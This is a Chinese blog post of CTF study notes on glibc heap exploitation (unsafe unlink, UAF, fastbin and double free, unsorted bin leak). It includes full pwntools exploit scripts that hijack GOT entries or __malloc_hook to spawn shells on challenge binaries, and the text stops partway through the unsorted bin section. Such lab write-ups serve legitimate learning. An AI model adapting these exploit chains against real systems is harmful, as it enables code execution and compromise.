---
layout: post
title: glibc漏洞利用-backup
category: system/Heap
date: 2023-9-23 21:04:32
---
Heap基础知识
<!-- more -->
[toc]


# tips

- 在32位下，若申请一个大小为0x8的chunk，那么总共会得到的chunk的大小为0x10，原因是会加上一个0x8的header。
- 一个`word`是2字节，那么`DWORD`是4字节，`QWORD`是8字节。
- 同样的，在64位下，若申请一个大小为0x8的chunk，那么总共得到的chunk的大小为0x18，原因是会加上一个0x10的header。
- `BUU`的`glibc`是`glibc2.23-0ubuntu11`

# TODO

- 总结一些`trick`，包括`chunk shrink`

# 泄露libc的方法汇总

- 申请一个非常大的堆块时会使用`mmap`来申请内存，而这样申请来的内存和`libc`的偏移是固定的，因此可以泄露这样申请来的内存的地址来泄露`libc`
- `unsorted bin leak`

# 64位下各个bin的大小范围(with header)

| fast bin      | small bin      | large bin                                                    |
| ------------- | -------------- | ------------------------------------------------------------ |
| `0x20`-`0x80` | `0x90`-`0x3f0` | 第一个`largebin`：`0x400`-`0x430`<br />第二个`largebin`：`0x440`-`0x470`<br />第三个`largebin`：`0x480`-`0x4b0`<br />第四个`largebin`：`0x4c0`-`0x4f0`<br />... |

# 各个bin的使用&释放顺序

| fast bin                                               | small bin                                                    |
| ------------------------------------------------------ | ------------------------------------------------------------ |
| 释放时添加到链表头<br />取出时从链表头取出<br />`LIFO` | 从`unsorted bin`添加到链表头<br />取出时从链表尾部取出<br />`FIFO` |

| unsorted bin                                             | large bin                                                    | tcache bin                                             |
| -------------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------ |
| 释放时添加到链表头<br />取出时从链表尾部取出<br />`FIFO` | 从`unsortedbin`挂入时，按照大小顺序放入对应位置<br />取出同样按照大小顺序 | 释放时添加到链表头<br />取出时从链表头取出<br />`FILO` |

# pwndbg命令

```bash
parseheap # 可以查看当前的所有chunk，以及chunk的地址、prev大小、size、status和fd等等。

hex 0x8e1000 2300 # 可以查看0x8e1000地址往后2300个长度存放的值

telescope 0x602300 # 可以查看目标地址内存放的指针指向的值和地址

x/nuf 0x123456 
n表示显示的长度
u可以填b表示字节，h表示双字节，w表示四字节，g表示八字节
f表示显示数据的格式，例如x表示十六进制，u表示十六进制无符号，d表示十进制，s表示字符串
例如x/32gx &main_arena表示将main_arena地址处的值输出32个，每一个值是8字节的十六进制数。
查看&main_arena前面0x40字节处：x/32gx (long long)(&main_arena) - 0x40

p func_name 打印函数的地址
p &a 查看变量a的地址
p/x &a 以十六进制的方式查看变量a的地址
p/x (0x12345678 - (long long)&main_arena) 计算大小需要转换类型
p *(0x123456) 查看0x123456地址处的值，区分x指令，x 0x123456可以同样效果

set $x = $libc 赋值
p/x $x
backtrace查看调用栈

arenainfo 显示所有arena的信息

canary 直接打印canary的值

find_fake_fast 可以通过偏移等方式寻找一个fake_chunk，主要用于double free时绕过安全检查。
如 find_fake_fast &__malloc_hook
```

# one_gadget使用

作用：

```tex
可以直接找到一个getshell的gadget。
```

安装

```bash
gem install one_gadget
```

使用

```bash
one_gadget ./libc.so.6 # 得到的是基于libc_base的gadget地址
```

# gcc使用指定版本glibc编译

首先要`glibc-all-in-one`不必多说

在gcc中，可以使用`-Wl,<options>`来将逗号分隔的`<options>`传递给链接器。

由此，若使用`glibc2.23`，则编译命令为：

```gcc
gcc -Wl,-rpath='/home/ltfall/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/',-dynamic-linker='/home/ltfall/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2' -g ./test.c -o test
```

即分别指定了`-rpath`和`-dynamic-linker`。为了避免每次都输入相当长的命令，笔者编写了`bash`脚本如下：

```bash
#!/bin/bash

if [ "$#" -lt 2 ]; then
    echo "Need 2 arguments of glibc path, filename"
    echo "e.g. gcc_libc /home/ltfall/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11_amd64 house_of_lore"
    exit 1
fi

RPATH="$1"
FILE_NAME="$2"
shift 2
ADDITION="$@"
DYNAMIC_LINKER="$RPATH/ld-linux-x86-64.so.2"

gcc $ADDITION -Wl,-rpath="$RPATH",-dynamic-linker="$DYNAMIC_LINKER" -g ./"$FILE_NAME".c -o "$FILE_NAME"
```

笔者将其命名为`gcc_libc`，并将其置入`/usr/bin`目录下，即可使用该方式来快速使用指定版本`glibc`进行编译：

```bash
gcc_libc ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/ house_of_lore (-no-pie)
```

这里的`ld-linux-x86-64.so.2`是一个符号链接，它指向当前文件夹内部的`ld-2.xx.so`，这样可以不受版本影响文件名。

# 使用patchelf

有的题目需要更改`libc`版本，因此需要使用`patchelf`。

可以使用`glibc-all-in_one`这个工具来下载。

以`2.23-0ubuntu3_amd64`为例子，在`glibc-all-in_one`目录下使用：

```bash
./download 2.23-0ubuntu3_amd64
```

上面这条命令可以下载下来对应的`glibc`，`download`那个脚本已经被我更改成外网的源了，因为默认清华源是没有的。

下好之后在`glibc-all-in-one/libs`目录下。

使用如下两条命令，进行`glibc`的切换：

```bash
patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so ./uunlink
patchelf --set-rpath ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 ./uunlink
# 若只是切换libc：
patchelf --replace-needed libc.so.6 ./libc-2.31.so ./uunlink
```

可以看到第二条命令是让它在文件夹里自动搜寻对应的版本，路径不要搞错了。

`ldd`一下可以看到已经修改成功：

```bash
ldd ./uunlink
```

![image-20230108175223269](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301081752097.png)

# glibc源码

我是在[这里](https://launchpad.net/ubuntu/+source/glibc/)找的，找到对应版本，比如我这里是想看看`2.23-0ubuntu3`的，就下了这个：

![image-20230108194726875](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301081947999.png)

然后找到里面的这一个：

![image-20230108194754494](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301081947637.png)

下载到`ubuntu`然后解压即可。

然后，可以通过[这里](https://codebrowser.dev/)来搜寻对应的函数或者文件，或者也可以直接在这里查看，但为了调试，可以仅仅只是找到在哪里，如图：

![image-20230108195407693](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301081954192.png)

打开之后，发现是在`glibc/malloc/malloc.c`里面。开始`read the fucking code`吧。

# unsafe unlink

一句话，`unsafe unlink`漏洞是：控制相邻两个`chunk`的`prev size`和`prev_inuse`和`fd bk`等字段的值，以及攻击者明确存放这些`chunk`的地址的指针时，使得程序对不正确的位置进行`unlink`，从而达到任意地址写的目的。

**注意，`small bin`和`fastbin `不会使用`unlink`。**

接下来，我们一步步地看，第一步需要明确什么是正常的`unlink` 。

试想，假如有两个物理相邻的`chunk`，第一个是`free`的，而第二个是`used`。此时，若第二个`chunk`被`free`时，由于前一个`chunk`和他是物理相邻且被`free`的，因此第一个和第二个`chunk`将被合并，且是第一个`chunk`后向合并第二个，并且修改第一个`chunk`的`size`，即合并之后的`size`。

合并时，由于第一个`chunk`本身是处在双向链表`bins`里面的，因此需要把第一个`chunk`从`bins`里面删除，待合并后再放到`unsorted bin`里面去。而第一个`chunk`从`bin`里面删除的操作就叫做`unlink`。

由于之前第一个`chunk`所在的地方是一个双向链表，因此把第一个`chunk`从`bin`里面删除的过程是这样：先断开`chunk`和前后两个`chunk`的指针，然后把它之前的`chunk`指向它后面的，它后面的`chunk`指向它之前的。画个草图示意一下：

![image-20230108202216108](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301082022679.png)

这就是正常的`unlink`流程。然而，`unsafe unlink`是利用其中的漏洞。

我们看`unlink`部分的源码：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) { 
    // 注意这里是glibc2.23，若为更高版本，开头会进行检查即P的chunksize是否等于P的下一个chunk的prevsize。                                           
    FD = P->fd;	// 将要unlink的前向为FD							      
    BK = P->bk;	 // 将要unlink的后向为BK						      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
        // 这个if语句是一个检查。假如FD的后向不是P，BK的前向不是P，就无法通过检查。
        // 因此，若想使用unsafe unlink漏洞，需要保证FD的后向是P，BK的前向是P。
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {								      
        // 通过上面的安全检查了，那接下来就进行unlink。 若是使用bk或者fd指针的chunk，那么下面两行后就结束了。
        FD->bk = BK; // 将FD的后向连接到BK 							      
        BK->fd = FD; // 将BK的前向连接到FD						
        // 假如连接方式不是bk和fd指针，那就需要判断是不是用的fd_nextsize或者bk_nextsize指针。	      
        if (!in_smallbin_range (P->size)				      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {  // 这个if判断1.不是smallbin(fd/bk)2.有用到fd_nextsize    
              if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      
            || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) // 安全检查：P的后向的前向确实为P，和本宏第一个if作用类似。利用漏洞需要突破这个    
                malloc_printerr (check_action,				      
                    "corrupted double-linked list (not small)",    
                    P, AV);				      
                    if (FD->fd_nextsize == NULL) {		// 这里有点没懂为啥是FD的前向
                          if (P->fd_nextsize == P) // 假如P的前向还是P，说明这个链表就P一个，后面暂时没看懂		     
                            FD->fd_nextsize = FD->bk_nextsize = FD;	
                          else {							      
                              FD->fd_nextsize = P->fd_nextsize;			      
                              FD->bk_nextsize = P->bk_nextsize;			      
                              P->fd_nextsize->bk_nextsize = FD;			      
                              P->bk_nextsize->fd_nextsize = FD;			      
                            }							      
                      } else {
                        // unlink的正常操作							      
                        P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      
                        P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      
                      }								      
          }								      
      }									      
}
```

可以知道，设`FD = P->fd，BK = P-> bk`只要满足安全检查：

```
FD的bk等于P，且BK的fd等于P
```

就会实现：

```
FD->bk = BK
BK->fd = FD
```

再看一下触发`unlink`操作的源码，此处以`free`为例子：

```c
if (!prev_inuse(p)) { // 若P物理地址的上一个chunk没有被使用，那么free P时，P和上一个chunk将进行合并，并将上一个chunk unlink
    prevsize = p->prev_size; // P的上一个chunk的大小
    size += prevsize;  // P的size加上上一个chunk的size，就得到了合并后的size
    p = chunk_at_offset(p, -((long) prevsize));  // 通过prevsize，向上偏移得到上一个chunk
    unlink(av, p, bck, fwd); // 此时P已经是上一个chunk的指针，将其unlink
}
```

`unsafe unlink`就是通过溢出，在P的上一个chunk中的用户可用部分伪造一个小chunk，从而达到任意地址写的目的。首先看图：

![image-20230110180557450](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301101805328.png)

上图是P和P的上一个Chunk，称为Prev Chunk。只要Chunk P中的P为0，那么Prev Chunk就会被识别为freed chunk。此时若再对Chunk P进行free操作，那么Prev Chunk就会被unlink。

试想，若我们修改Chunk P的Prev_Size的值，那么便可以对被`unlink`的地方任意控制！以64位为例，我们若将Prev_Size的值缩小0x8，那么Chunk P的上一个Chunk将是上图中Prev Chunk的Size部分，而不是正确的Prev_Size部分。由此，我们可以通过伪造P的Prev Size，使得对指定位置进行`unlink`。

若将Chunk P的Prev_Size缩小0x10，那么将会对Prev Chunk的fd指针处开始unlink，而这个地方恰好一般是可控的，因此相当于我们在此处完全可以伪造一个新的Chunk，如图所示：

![image-20230110180522157](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202301101805007.png)

下划线部分是人为控制的，需要尽量控制这些值才可以进行`unsafe unlink`。

伪造的Fake Chunk是虚线框部分。

此时，若对Chunk P进行free，那么Fake Chunk将会被unlink。

我们回顾`unlink`部分：

```c
#define unlink(AV, P, BK, FD) {                                          
    FD = P->fd;							      
    BK = P->bk;	 					      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {								      
        FD->bk = BK; 						      
        BK->fd = FD; 
    }
... 
```

此时传入unlink宏的P，即是Fake Chunk。

那么很明显，满足安全机制`P->fd->bk == P`以及`P->bk->fd == P`才可以进行赋值操作。

我们知道，bk指针实际上只是偏移0x18个字节，fd指针实际上只是偏移0x10字节。

因此：

```c
P->fd->bk == P;
// 等价于
*(P->fd + 0x18) == P;
// 等价于
P->fd + 0x18 == &P;
// 等价于
P->fd = &P - 0x18
```

由此看来，我们只要满足fake chunk中的fd的值为&P - 0x18，即可绕过安全机制。

同样的，bk的值需要为&P - 0x10。注意，这里的P是合并到的地址。

若此时有一个数组/指针，专门用于存放这些`chunk`的地址时，&P便是可知的。

满足安全机制后，便会进行unlink：`FD->bk = Bk , BK->fd = FD`，如下：

```c
P->fd->bk = P->bk;
// 等价于
*(P->fd + 0x18) = &P - 0x10;
// 等价于
*(&P) = &P - 0x10;
P = &P - 0x10;

// 第二行同样：
P->bk->fd = P->fd;
// 等价于：
P = &P - 0x18;
// 即： P指向P自己的地址减去0x18的地方！
```

在可以利用的情况下，用户是可以对自己malloc的chunk进行修改的。因此对prev chunk进行修改，直接会变为修改存放这些chunk的数组/指针的值，我们便可以使其指向任意地址，并完成任意地址写。

## 例题uunlink

exp:

```python
from pwn import *
local = 1
elf = ELF('./uunlink')
context(log_level='debug')
if local:
    p = process('./uunlink')
    libc = elf.libc


def malloc(index, size):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Give me a book ID: ')
    p.sendline(str(index))
    p.recvuntil('how long: ')
    p.sendline(str(size))


def free(index):
    p.recvuntil('Your choice: ')
    p.sendline("3")
    p.recvuntil("Which one to throw?")
    p.sendline(str(index))


def edit(index, size, content):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Which book to write?')
    p.sendline(str(index))
    p.recvuntil("how big?")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(content)

def debug():
    pid = util.proc.pidof(p)[0]
    print('pid:{}'.format(pid))
    gdb.attach(pid)
    pause()


# 创建四个chunk 
malloc(0, 0x30)
malloc(1, 0xf0)
malloc(2, 0x100)
malloc(3, 0x100)


# 下面伪造fake chunk，并通过溢出修改第二个chunk的prev_inuse，prev_size等
fd = 0x602300 - 0x18
bk = 0x602300 - 0x10
py = b''
py += p64(0) + p64(0x31)
py += p64(fd) + p64(bk)
py += p64(0) + p64(0)
py += p64(0x30) + p64(0x100)
py += p64(0) + p64(0)
py += p64(0) + p64(0)
edit(0, 0x60, py)
# free会触发unlink
free(1)

# 接下来，edit第一个chunk会导致本来指向这些chunk的指针指向别的地方
atoi_got = elf.got['atoi']
free_got = elf.got['free']
py = b''
py += b'a'*0x18 + p64(atoi_got) + p64(atoi_got) + p64(free_got)
edit(0, 0x30, py)


# 这里将free的got表指向puts_plt，调用free时会变成调用puts
edit(2, 0x8, p64(elf.plt['puts']))
# 下面是程序里的free，其实是执行free(chunk[0])，也就是puts(chunk[0])，会打印atoi的got表
free(0)
a = p.recv()
atoi_libc = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = atoi_libc - libc.symbols['atoi']
system_libc = libc_base + libc.symbols['system']
edit(1, 0x8, p64(system_libc))
p.recvuntil('Your choice: ')
p.sendline(b'/bin/sh\x00')
p.interactive()
```



# use after free (UAF)

顾名思义，`use after free`是对已经被`free`的内容进行读写的操作。若用户在对指针进行`free`操作后没有将其置空，则该指针可能仍然可以被使用。（根据测试，`glibc2.23`中仍然可以使用，但在最新版本中对`free`后的指针使用会报错，具体修复版本待测试）

以一道例题`hacknote`为例子：

![image-20230209153120915](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202302091531551.png)

`32位程序`，经典菜单，这个程序有三种功能，即添加、删除、打印`note`。

`add_note`部分代码如下：

```c
unsigned int add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i ) // 最多有五个note
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u); // notelist[i]申请了8字节空间
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)notelist[i] = print_note_content; // 前面四字节空间指向打印函数
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i]; // notelist[i]赋值给v0
        v0[1] = malloc(size);  // v0是DWORD，四字节，那么就是notelist[i]的后面四字节指向大小为size的一片空间
        if ( !*((_DWORD *)notelist[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)notelist[i] + 1), size); // 赋值到notelist[i]的后面四字节指向的位置
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

从上面可以看出，最多有5个note，每一个note为8字节，前四字节指向一个打印内容的函数，后四字节指向大小为size的一片空间，其中size和该空间的内容都是用户输入的。

接下来是`delete_note`部分：

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(*((void **)notelist[v1] + 1));
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

可以看到有两个`free`操作，第一个是对每一个note的后四字节指向的content，第二个是对note本身。

本题的核心就是这里在`free`过后是没有进行置零操作的，因此在老版本的`glibc`中，仍然可以对其进行操作。

再看最后的`print_note`：

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    (*(void (__cdecl **)(_QWORD *))notelist[v1])(notelist[v1]); // 调用函数
  return __readgsdword(0x14u) ^ v3;
}
```

可以看到进行打印note的函数逻辑是，调用notelist[i]的前四个字节的函数，且将notelist[i]本身作为参数传递。

`print_note_content`函数，也就是每个notelist[i]的前四个字节的函数如下：

```c
int __cdecl print_note_content(int a1)
{
  return puts(*(const char **)(a1 + 4)); // puts函数对传进来的参数偏移4字节的地方输出
}
```

程序中可能用到的一处后门函数：

```c
int magic()
{
  return system("cat flag");
}
```

该后门函数入口地址是`0x08048986`。

现在我们已经明白整个程序的工作流程了。由于`free`后，程序并没有将指针置零，因此用户可以对已经被`free`的内容进行修改。那如何进行修改呢？实际上，当用户申请的`chunk`被`free`以后，该`chunk`会添加到`fastbin`中，若用户再次申请等同于该`chunk`大小的空间时，该`chunk`又会被分配给用户使用。在本程序中，用户只能在`add_note`中对`chunk`进行赋值，由此可以用如下流程进行`UAF`:

- 用户添加两块大小为0x10字节的note，分别设为note0和note1
- 申请每个note时，会先申请0x8字节用于存放note的两个指针。
- 删除note0，再删除note1。那么有四个空间被`free`，分别为：大小为0x8字节的note0的空间，note0后四字节指向的大小为0x10的content的空间，大小为0x8字节的note1的空间，note1后四字节指向的大小为0x10的content的空间。
- 由于fastbins是先进后出，因此fastbin链表中有：大小为0x10字节的note1->note0，大小为0x18字节的content1->content0。注意其中加上了header的0x8字节，32位下是0x8字节的header。
- 用户此时再申请一个大小为0x8的note，设为note2，先申请0x8字节用于存放note2的两个指针，那么这里申请到的0x8字节的空间实际上是note1。再申请0x8字节的空间用于存放note2后四字节指向的content，这里实际上申请到的是note0。
- 用户申请note2时可以对其进行赋值，赋值实际上是对note0进行修改。若对其赋值为`0x08048986`，那么note0的前四字节将会被修改为`0x08048986`。此时用户对note0进行打印操作，那么会调用`0x08048986`处的函数，也就是后门函数，成功执行漏洞。

`exp`如下：

```python
from pwn import *

context(log_level='debug')
sh = process('./hacknote')
elf = ELF('./hacknote')
libc = elf.libc

def debug():
    pid = util.proc.pidof(sh)[0]
    print('pid:{}'.format(pid))
    gdb.attach(pid)
    pause()

def add_note(size, content):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('Note size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.sendline(content)

def delete_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

def print_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

add_note(0x10, 'test')
add_note(0x10, 'what')
delete_note(0)
delete_note(1)
# debug()
add_note(0x8, p32(0x08048986))
print_note(0)
sh.interactive()
```

# fastbin attack

首先要知道`fastbin`的`chunk`的大小范围。

> 32位下，fastbin chunk的范围是16字节 - 64字节（0x10 - 0x40）
>
> 64位下，fastbin chunk的范围是32字节-128字节（0x20 - 0x80）
>
> 注意，这是加上header的大小。

`fastbin`方法流程比较简单，即通过某种手段能够控制`fastbin`中的`chunk`的`fd`指针时，将其指向一个想要往其写入数据的地方，这样再次`malloc`这个大小的`chunk`的时候就可以将这个地方分配为`chunk`，达到任意地址写的效果。但是条件如下：

- fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
- **fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。**
- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

要注意，被指向的地方的`chunk header`中的`size`必须满足`fastbin`的要求，即大小和`fastbin`中指向该`fake chunk`的`chunk`大小相同。若无法直接找到，可以利用地址偏移一些来寻找，也可以借助工具，比如`pwndbg`中可以使用`find_fast_chunk addr`来寻找一个可以覆盖掉`addr`地址的`chunk`。

例题是0ctf_2017_nanyheap：

整体思路是使用`unsort bin`泄露`main_arena`（`unsort bin`在只有一个`chunk`的时候`fd`和`bk`都指向`main_arena`的某个固定偏移处），再通过`main_arena`计算偏移得到`libc`和其他函数地址。

之后使用`fastbin attack`来向`__malloc_hook`中写入`one_gadget`算出来的`gadget`即可。注意，本来`malloc_hook`前是没有明显的可以分配的`fastbin`大小的`chunk`的，但是可以通过小部分偏移来得到刚好可以覆盖掉`__malloc_hook`的`chunk`，此处在`pwngdb`使用命令`find_fast_chunk &__malloc_hook`即可。

```python
# value
# size
# pointer -> malloc(size)
from pwn import *
from LibcSearcher import *

filename = './0ctf_2017_babyheap'
context(log_level='debug')
local = 1
elf = ELF(filename)
# libc = ELF('./libc.so.6')
# libc = ELF('/home/ltfall/Desktop/pwn/buuctf_libc/ubuntu16_64/libc-2.23.so')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', 25212)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

def allocate(size):
    sh.sendlineafter(': ', '1')
    sh.sendlineafter(': ', str(size))

def fill(index, size, content):
    sh.sendlineafter(': ', '2')
    sh.sendlineafter(': ', str(index))
    sh.sendlineafter(': ', str(size))
    sh.sendafter(': ', content)

def free(index):
    sh.sendlineafter(': ', '3')
    sh.sendlineafter(': ', str(index))

def dump(index):
    sh.sendlineafter(': ', '4')
    sh.sendlineafter(': ', str(index))

# 首先申请三个0x80的chunk，大概思路是先free第1个chunk，然后通过第0个chunk溢出修改第1个chunk的head，让OS误认为chunk1的大小是chunk1+chunk2
# 此时申请回chunk1，但是chunk1此时就是chunk1+chunk2两个块重合了，然后因为题目里面是calloc，因此将变成0的恢复，然后free掉chunk2，chunk2将会被添加到unsortbin
# 因此chunk2的fd和bk都会指向main_arena，此时打印chunk1，打印的实际上是chunk1+chunk2两个块，因此可以打印出chunk2的fd和bk，并由此得出&main_arena、libc_addr。
allocate(0x80)
allocate(0x80)
allocate(0x80)
allocate(0x20) # 没有这个 做不出来 挺怪的
free(1)
fill(0, 0x90, b'a'*0x80 + p64(0) + p64(0x121))
allocate(0x110)
payload = b'a'*0x80 + p64(0) + p64(0x91) + b'c'*0x80 
fill(1, len(payload), payload)
free(2)
dump(1)
main_arena = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x58
info('the addr of main_arena is {}'.format(hex(main_arena)))
libc_addr = main_arena - 0x3c4b20
info('the libc addr is {}'.format(hex(libc_addr)))
fake_chunk_addr = libc_addr + 0x3c4aed
info('the fake_chunk_addr is {}'.format(hex(fake_chunk_addr)))
malloc_hook = libc_addr + 0x3c4b10
info('the addr of malloc_hook is {}'.format(hex(malloc_hook)))

# 接下来是fastbin attack
allocate(0x80) # 还原
# 此时到这里 前面几个chunk不管了 接下来是以chunk4开始的fast bin大小的chunk
allocate(0x60) # chunk4
allocate(0x60) # chunk5
free(5)
payload = b'd'*0x60 + p64(0x70) + p64(0x71) + p64(fake_chunk_addr)
fill(4, len(payload), payload)
allocate(0x60) # 还是chunk5
allocate(0x60) # chunk6

one_gadget = 0x4526a
payload = b'a'*(0x23 - 0x10) + p64(libc_addr + one_gadget)
fill(6, len(payload), payload)

allocate(0x10)
sh.interactive()
```

## Double Free

顾名思义，也就是将一个已经在`fastbins`里面的`chunk`再次添加到`fastbins`里面去，添加完成后就会有两个同样的`chunk`在一个`bins`里面。

比如：

```c
void* chunk1 = malloc(0x10);
void* chunk2 = malloc(0x10);

free(chunk1);
free(chunk2);
free(chunk1);
```

这样一来，在`fastbins`的大小为`0x20`的`bin`中，就会有：

![image-20230217172959638](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230217172959638.png)

因为`chunk1`指向`chunk2`，因此最右边的`chunk1`也会指向`chunk2`。

**值得注意的是，`fastbin`会对直接与`main arena`连接的`chunk`进行检查，因此必须借助第二个`chunk`才可以让两个一样的`chunk`都在同一个`bins`里面。**

有什么用呢？

若此时我们再申请一个`chunk`，那么左边的`chunk1`将会被申请到，若我们能够修改`chunk1`，便相当于修改了还在`fastbins`里面的右边的`chunk`的`fd`指针。如此以来，若当目前在`fastbins`里面的`chunk`都被`free`了，由于最右边的那个`chunk1`的`fd`指针是我们设计的值，那么接下来再进行`malloc`操作时，便会将我们设计的值作为地址，将我们指定的地址作为一个`chunk`返回给我们。相当于是实现了一个任意地址写的功能。

**但没有那么简单，我们设计的值作为地址的地方要作为`chunk`返回，必须要满足一个条件，即这个`chunk`的`size`值必须和`bins`单链表里面的其他`chunk`相同。**这样一来就没有问题了。

#### 例题wustctf2020_easyfast

exp

```python
# uaf漏洞，借助了0x602088处的有一个50的值，因为double free任意写的chunk的size必须和分配的相等，不然报错。

from pwn import *

context(log_level='debug')

elf = ELF('./wustctf2020_easyfast')
# sh = process('./wustctf2020_easyfast')
sh = remote('node4.buuoj.cn', 27643)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

def add(size):
    sh.recvuntil('choice>\n')
    sh.sendline('1')
    sh.recvuntil('size>\n')
    sh.sendline(str(size))

def delete(index):
    sh.sendlineafter('choice>\n', '2')
    sh.sendlineafter('index>\n', str(index))
    
def modify(index, content):
    sh.sendlineafter('choice>\n', '3')
    sh.sendlineafter('index>\n', str(index))
    sh.send(content)

add(0x40)
add(0x40)

delete(0)
delete(1)
delete(0)

modify(0, p64(0x602080))

# debug()
add(0x40)
add(0x40)

modify(3, p64(0))

sh.recvuntil('>\n')
sh.sendline('4')

sh.interactive()
```

# unsortedbin attack

广义上的`unsorted bin attack`其实分为`unsorted bin leak`和`unsorted bin attack`，前者可以根据`unsorted bin`的特性来泄露出`libc`的地址，后者的作用是对一个指定地址写入一个非常大的值（其实是写入`main_arena`的地址的一个偏移）。

## unsortedbin特性

首先是`unsorted bin`的来源，这里抄一下`wiki`

```
1.当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
2.释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。
3.当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。
```

然后是使用情况，抄一下`wiki`

```
1.Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。
2.在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。
```

用一下`gzy`的图

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/876323_83TKRFDZJ5XP3GC.jpg)

## unsortedbin leak

从上图也可以看到，与`unsorted bin`直接相连的一个`bin`是最后插入到`unsorted bin`里面来的。它的`bk`指针指向`unsorted bin`。换句话说，它的`bk`指针指向`main_arena`的一个固定偏移，而`main_arena`和`libc_base`也有一个固定偏移，那么只要泄露出来了它的`bk`指针，也就不愁计算出`libc`的地址了。这里用先插入到`unsorted bin`的`fd`指针也是同理的。

## unsortedbin attack

作用是向指定地址写入一个非常大的值，即`main_arena`的一个固定偏移。

`unsotred bin attack`的攻击过程发生在这种情况：

